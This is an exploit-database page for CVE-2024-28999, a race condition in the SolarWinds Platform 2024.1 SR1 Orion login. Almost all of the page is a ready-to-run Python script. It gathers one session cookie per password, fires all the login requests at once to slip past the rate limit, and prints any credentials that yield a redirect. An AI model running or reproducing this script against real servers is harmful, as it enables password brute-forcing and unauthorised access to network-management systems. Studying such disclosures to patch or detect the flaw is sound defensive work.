---
title: SolarWinds Platform 2024.1 SR1 Race Condition
url: https://cxsecurity.com/issue/WLB-2024060062
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-27
fetch_date: 2025-10-06T16:54:24.863513
---

# SolarWinds Platform 2024.1 SR1 Race Condition

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SolarWinds Platform 2024.1 SR1 Race Condition** **2024.06.26**  Credit:  **[AKA 0xsphinx](https://cxsecurity.com/author/AKA%2B0xsphinx/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-28999](https://cxsecurity.com/cveshow/CVE-2024-28999/ "Click to see CVE-2024-28999")**  CWE: **[CWE-362](https://cxsecurity.com/cwe/CWE-362 "Click to see CWE-362")** | |

# Exploit Title: SolarWinds Platform 2024.1 SR1 - Race Condition
# CVE: CVE-2024-28999
# Affected Versions: SolarWinds Platform 2024.1 SR 1 and previous versions
# Author: Elhussain Fathy, AKA 0xSphinx
import requests
import urllib3
import asyncio
import aiohttp
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
http = urllib3.PoolManager(cert\_reqs='CERT\_REQUIRED')
# host = '192.168.1.1'
# username = "admin"
# file\_path = "passwords.txt"
host = input("Enter the host: ")
username = input("Enter the username: ")
file\_path = input("Enter the passwords file path: ")
exploited = 0
url = f"https://{host}:443/Orion/Login.aspx?ReturnUrl=%2F"
passwords = []
with open(file\_path, 'r') as file:
for line in file:
word = line.strip()
passwords.append(word)
print(f"Number of tested passwords: {len(passwords)}")
headers = {
'Host': host,
}
sessions = []
for \_ in range(len(passwords)):
response = requests.get(url, headers=headers, verify=False, stream=False)
cookies = response.headers.get('Set-Cookie', '')
session\_id = cookies.split('ASP.NET\_SessionId=')[1].split(';')[0]
sessions.append(session\_id)
async def send\_request(session, username, password):
headers = {
'Host': host,
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8',
'Cookie': f'ASP.NET\_SessionId={session}; TestCookieSupport=Supported; Orion\_IsSessionExp=TRUE',
}
data = f'\_\_EVENTTARGET=ctl00%24BodyContent%24LoginButton&\_\_EVENTARGUMENT=&\_\_VIEWSTATE=AEQKNijmHeR5jZhMrrXSjzPRqhTz%2BoTqkfNmc3EcMLtc%2FIjqS37FtvDMFn83yUTgHBJIlMRHwO0UVUVzwcg2cO%2B%2Fo2CEYGVzjB1Ume1UkrvCOFyR08HjFGUJOR4q9GX0fmhVTsvXxy7A2hH64m5FBZTL9dfXDZnQ1gUvFp%2BleWgLTRssEtTuAqQQxOLA3nQ6n9Yx%2FL4QDSnEfB3b%2FlSWw8Xruui0YR5kuN%2BjoOH%2BEC%2B4wfZ1%2BCwYOs%2BLmIMjrK9TDFNcWTUg6HHiAn%2By%2B5wWpsj7qiJG3%2F1uhWb8fFc8Mik%3D&\_\_VIEWSTATEGENERATOR=01070692&ctl00%24BodyContent%24Username={username}&ctl00%24BodyContent%24Password={password}'
async with aiohttp.ClientSession() as session:
async with session.post(url, headers=headers, data=data, ssl=False, allow\_redirects=False) as response:
if response.status == 302:
global exploited
exploited = 1
print(f"Exploited Successfully Username: {username}, Password: {password}")
async def main():
tasks = []
for i in range(len(passwords)):
session = sessions[i]
password = passwords[i]
task = asyncio.create\_task(send\_request(session, username, password))
tasks.append(task)
await asyncio.gather(\*tasks)
asyncio.run(main())
if(not exploited):
print("Exploitation Failed")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060062)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top